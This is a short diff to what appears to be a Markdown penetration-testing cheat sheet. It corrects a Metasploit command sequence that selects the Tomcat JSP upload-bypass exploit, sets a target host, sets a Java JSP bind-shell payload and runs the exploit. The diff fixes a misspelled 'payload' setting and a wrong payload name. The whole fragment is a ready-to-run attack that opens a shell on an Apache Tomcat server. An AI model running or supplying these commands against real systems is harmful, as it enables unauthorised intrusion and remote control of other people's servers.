@@ -2444,7 +2444,8 @@ run
 search type:exploit tomcat_jsp
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set RHOST <ip-address>
-set pyload java/jsp_shell_blind_tcp
+show payloads
+set payload java/jsp_shell_bind_tcp
 set SHELL cmd
 exploit
 ```
